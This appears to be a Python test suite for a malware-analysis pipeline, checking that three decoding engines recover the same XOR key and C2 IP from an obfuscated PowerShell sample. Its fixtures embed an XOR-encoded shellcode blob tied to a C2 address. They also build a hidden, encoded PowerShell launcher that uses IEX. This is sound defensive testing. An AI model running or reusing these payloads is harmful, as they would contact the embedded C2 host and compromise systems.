"""Phase A · Slice 3 · PowerShell.ByteArrayXor — HIGHEST-VALUE SLICE.

Today this transformation exists in **THREE** places:

    1. services/die/preprocessor/recursive_decoder.py  · _decode_byte_array_xor_loop
    2. v2/investigation/rte/transformations/ps_byte_array_xor_loop.py
    3. services/uaie/plugins/transformer_byte_array_xor_loop/    (UAIE canonical)

The Phase-A goal for Slice 3 is:

    ✅ UAIE owns the canonical capability
    ✅ Legacy paths (deep-peel + RTE) are proven equivalent
    ✅ 4-dim migration gate green
    ✅ Golden Vertical Chain preserved
    ✅ Retirement gates locked in — every gate green before the two
       duplicate legacy implementations may be deleted

Slice-3 completion removes the biggest source of duplicated behaviour
in the codebase.
"""
from __future__ import annotations

import base64
import gzip

from services.uaie import plugins as _p           # noqa: F401
from services.uaie.orchestrator import Orchestrator
from services.uaie.migration_gate import (
    uaie_extract, legacy_extract,
)


# ── Golden Vertical Chain payload (identical fixture across slices) ──
_XORED_B64 = (
    "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
    "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
    "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
    "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
    "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
    "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
    "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
    "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
    "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
    "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
    "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
    "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
    "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
    "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
    "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
    "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
    "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
    "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
    "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg")

_EXPECTED_C2 = "149.28.81.19"
_EXPECTED_XOR_KEY_HEX = "0x23"
_EXPECTED_XOR_KEY_DEC = 35


def _new_orch() -> Orchestrator:
    return Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=128, max_depth=16)


# ── Isolated single-layer payload: [Byte[]]$c = FromBase64String(...) ─
#   +  for (...) { $c[$i] = $c[$i] -bxor <K> }
# Just enough to isolate the byte-array-XOR-loop transformation.
def _plain_byte_array_xor_payload() -> str:
    return (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
        f"'{_XORED_B64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
        f"    $var_code[$x] = $var_code[$x] -bxor {_EXPECTED_XOR_KEY_DEC}\n"
        f"}}\n"
        f"IEX $DoIt\n"
    )


# ══════════════════════════════════════════════════════════════════
# Slice 3 · Direct capability invocation
# ══════════════════════════════════════════════════════════════════
def test_slice3_uaie_transformer_extracts_xor_key_and_ip():
    """The UAIE ``transformer.byte_array_xor_loop`` plugin must
    recognise the idiom, extract the XOR key exactly, and produce
    a child artifact whose bytes contain the embedded C2 IP."""
    from services.uaie.plugins.transformer_byte_array_xor_loop import (
        _impl as _plugin,
    )
    from services.uaie.artifact import make_artifact
    art = make_artifact(_plain_byte_array_xor_payload().encode(),
                          "powershell")
    res = _plugin.execute(art)
    assert res.child_artifacts, "no child artifact produced"
    child = res.child_artifacts[0]
    # Meta records the XOR key exactly (plugin nests under its own name)
    raw_meta = getattr(child, "meta", {}) or {}
    meta = raw_meta.get("byte_array_xor_loop") or raw_meta
    assert meta.get("xor_key_dec") == _EXPECTED_XOR_KEY_DEC, (
        f"XOR key mismatch: {meta.get('xor_key_dec')} != "
        f"{_EXPECTED_XOR_KEY_DEC}")
    # Child payload contains the C2 IP (embedded as ASCII in shellcode)
    body = child.payload
    assert isinstance(body, (bytes, bytearray))
    assert _EXPECTED_C2.encode() in body, (
        f"C2 IP not in decoded bytes — first 200 bytes: {body[:200]!r}")


def test_slice3_legacy_recursive_decoder_extracts_same_key_and_ip():
    """Legacy ``_decode_byte_array_xor_loop`` must produce identical
    XOR-key + C2-IP output — proves the UAIE plugin and the legacy
    peel are behaviourally interchangeable."""
    from services.die.preprocessor.recursive_decoder import (
        _decode_byte_array_xor_loop as _legacy_xor,
    )
    result = _legacy_xor(_plain_byte_array_xor_payload())
    assert result is not None, "legacy XOR decoder returned None"
    new_text, meta = result
    assert meta["xor_key"] == _EXPECTED_XOR_KEY_DEC
    assert meta["xor_key_hex"].lower() == _EXPECTED_XOR_KEY_HEX.lower()
    assert meta["shellcode"] is True
    assert any(_EXPECTED_C2 in tok for tok in meta.get("embedded_iocs", []))


def test_slice3_rte_transformation_extracts_same_key_and_ip():
    """Legacy RTE ``ps_byte_array_xor_loop`` — must also produce
    identical XOR key and surface the C2 IP through evidence meta."""
    from v2.investigation.rte.transformations.ps_byte_array_xor_loop import (
        TRANSFORMATION as _rte_xor,
    )
    from v2.investigation.rte.models import Artifact as RTEArtifact
    from v2.investigation.iu import classify
    txt = _plain_byte_array_xor_payload()
    art = RTEArtifact(
        content=txt, classification=classify(txt), layer=0,
        content_hash="dummy", parent_hash=None, meta={},
    )
    ev = _rte_xor.applicable(art)
    assert ev is not None, "RTE ps_byte_array_xor_loop did not fire"
    assert ev.meta["xor_key"] == _EXPECTED_XOR_KEY_DEC
    new_content, apply_evs = _rte_xor.apply(art)
    # Every apply-time evidence should carry the C2 IP in meta
    all_iocs = []
    for e in apply_evs:
        all_iocs.extend(e.meta.get("embedded_iocs") or [])
    assert any(_EXPECTED_C2 in tok for tok in all_iocs), (
        f"C2 IP not in RTE evidence meta: {all_iocs}")


# ══════════════════════════════════════════════════════════════════
# Slice 3 · All 3 engines converge on the SAME XOR key + SAME C2 IP
# ══════════════════════════════════════════════════════════════════
def test_slice3_all_three_engines_agree_on_xor_key_and_c2():
    """The canonical Phase-A "no duplicate behaviour" check —
    prove all three current implementations produce byte-identical
    intent (key + C2)."""
    # UAIE
    from services.uaie.plugins.transformer_byte_array_xor_loop import (
        _impl as _uaie,
    )
    from services.uaie.artifact import make_artifact
    payload = _plain_byte_array_xor_payload()
    r_uaie = _uaie.execute(make_artifact(payload.encode(), "powershell"))
    _uaie_raw = getattr(r_uaie.child_artifacts[0], "meta", {}) or {}
    uaie_meta = _uaie_raw.get("byte_array_xor_loop") or _uaie_raw
    uaie_key  = uaie_meta["xor_key_dec"]

    # Legacy recursive_decoder
    from services.die.preprocessor.recursive_decoder import (
        _decode_byte_array_xor_loop as _legacy_xor)
    _, legacy_meta = _legacy_xor(payload)
    legacy_key = legacy_meta["xor_key"]

    # Legacy RTE
    from v2.investigation.rte.transformations.ps_byte_array_xor_loop import (
        TRANSFORMATION as _rte)
    from v2.investigation.rte.models import Artifact as RTEArtifact
    from v2.investigation.iu import classify
    art = RTEArtifact(content=payload, classification=classify(payload),
                        layer=0, content_hash="d", parent_hash=None, meta={})
    rte_ev = _rte.applicable(art)
    rte_key = rte_ev.meta["xor_key"]

    assert uaie_key == legacy_key == rte_key == _EXPECTED_XOR_KEY_DEC, (
        f"XOR key disagreement across engines: "
        f"uaie={uaie_key} legacy={legacy_key} rte={rte_key}")


# ══════════════════════════════════════════════════════════════════
# Slice 3 · Golden Vertical Chain guard
# ══════════════════════════════════════════════════════════════════
def _multi_layer_sophos_payload() -> str:
    layer2 = (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
        f"'{_XORED_B64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
        f"    $var_code[$x] = $var_code[$x] -bxor 35\n}}\nIEX $DoIt\n"
    )
    gz  = gzip.compress(layer2.encode())
    b64 = base64.b64encode(gz).decode()
    layer1 = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
        f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
        f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
        f'::Decompress))).ReadToEnd();'
    )
    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
    return (f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
            f"-encodedcommand {enc}")


def test_slice3_golden_chain_still_reaches_c2_ip():
    from analysis_core import deterministic_best_decode
    res = deterministic_best_decode(_multi_layer_sophos_payload())
    assert _EXPECTED_C2 in ((res.get("iocs") or {}).get("ip") or [])
    assert res.get("reached_shellcode") is True


# ══════════════════════════════════════════════════════════════════
# Slice 3 · Retirement gates — every gate green before we can safely
# delete ``services/die/preprocessor/recursive_decoder._decode_byte_array_xor_loop``
# AND ``v2/investigation/rte/transformations/ps_byte_array_xor_loop.py``
# ══════════════════════════════════════════════════════════════════
def test_slice3_retirement_gates_are_met():
    """The concrete acceptance checklist that must be true before
    either legacy byte-array-XOR implementation may be removed."""
    from services.uaie.plugins.transformer_byte_array_xor_loop import (
        _impl as _uaie)
    from services.die.preprocessor.recursive_decoder import (
        _decode_byte_array_xor_loop as _legacy_xor)
    from v2.investigation.rte.transformations.ps_byte_array_xor_loop import (
        TRANSFORMATION as _rte)
    from services.uaie.artifact import make_artifact
    from v2.investigation.rte.models import Artifact as RTEArtifact
    from v2.investigation.iu import classify

    payload = _plain_byte_array_xor_payload()

    # ── UAIE
    r_uaie = _uaie.execute(make_artifact(payload.encode(), "powershell"))
    _uaie_raw = getattr(r_uaie.child_artifacts[0], "meta", {}) or {}
    uaie_meta = _uaie_raw.get("byte_array_xor_loop") or _uaie_raw
    uaie_key  = uaie_meta.get("xor_key_dec")

    # ── Legacy peel
    _, legacy_meta = _legacy_xor(payload)
    legacy_key = legacy_meta["xor_key"]

    # ── Legacy RTE
    art = RTEArtifact(content=payload, classification=classify(payload),
                        layer=0, content_hash="d", parent_hash=None, meta={})
    rte_ev = _rte.applicable(art)
    _, rte_apply_evs = _rte.apply(art)
    rte_key = rte_ev.meta["xor_key"]
    rte_iocs = [tok for e in rte_apply_evs
                    for tok in (e.meta.get("embedded_iocs") or [])]

    gates = {
        # Gate 1 · UAIE reproduces the XOR key exactly
        "uaie_xor_key_correct": uaie_key == _EXPECTED_XOR_KEY_DEC,
        # Gate 2 · Legacy peel reproduces the same key
        "legacy_xor_key_correct": legacy_key == _EXPECTED_XOR_KEY_DEC,
        # Gate 3 · Legacy RTE reproduces the same key
        "rte_xor_key_correct": rte_key == _EXPECTED_XOR_KEY_DEC,
        # Gate 4 · All three engines agree
        "all_three_agree": uaie_key == legacy_key == rte_key,
        # Gate 5 · Legacy peel surfaces C2 in embedded_iocs
        "legacy_surfaces_c2": any(_EXPECTED_C2 in tok
            for tok in legacy_meta.get("embedded_iocs", [])),
        # Gate 6 · Legacy RTE surfaces C2 in evidence meta
        "rte_surfaces_c2":  any(_EXPECTED_C2 in tok for tok in rte_iocs),
        # Gate 7 · UAIE surfaces C2 in the child artifact payload
        "uaie_surfaces_c2": _EXPECTED_C2.encode() in
                                (r_uaie.child_artifacts[0].payload or b""),
    }
    failing = [k for k, v in gates.items() if not v]
    assert not failing, (
        "Slice-3 retirement gates NOT met — the two duplicate "
        "byte-array-XOR implementations MUST NOT be removed until: "
        f"{failing}\n"
        f"uaie_key={uaie_key} legacy_key={legacy_key} rte_key={rte_key}"
    )
